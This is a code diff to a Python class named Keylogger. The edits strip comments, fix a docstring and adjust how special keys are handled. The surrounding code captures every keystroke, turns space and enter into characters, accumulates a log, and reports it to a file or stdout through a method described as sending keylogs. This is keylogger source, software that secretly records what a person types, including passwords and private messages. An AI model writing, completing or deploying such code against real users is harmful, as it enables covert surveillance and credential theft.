@@ -17,12 +17,9 @@ class Keylogger:
         name = event.name
         if len(name) > 1:
             # not a character, special key (e.g ctrl, alt, etc.)
-            # uppercase with []
             if name == "space":
-                # " " instead of "space"
                 name = " "
             elif name == "enter":
-                # add a new line whenever an ENTER is pressed
                 name = "\n"
                 self.log += name
                 self.report()
@@ -38,12 +35,8 @@ class Keylogger:
                 if name in ["ctrl", "alt", "shift", "alt gr"]:
                     name = ""
                 else:
-                    # name = name.replace(" ", "_")
-                    # name = f"[{name.upper()}]"
                     name = ""
         self.log += name
-        # # start reporting the keylogs
-        # self.report()
 
     def report_to_file(self):
         """This method creates a log file in the current directory that contains
@@ -53,12 +46,11 @@ class Keylogger:
             f.flush()
 
     def report_to_stdout(self):
-        """This method write on all logged keys on stdout"""
+        """This method write all logged keys on stdout"""
         print(f"{self.log}", end="")
 
     def report(self):
         """
-        This function gets called every `self.interval`
         It basically sends keylogs and resets `self.log` variable
         """
         if self.log:
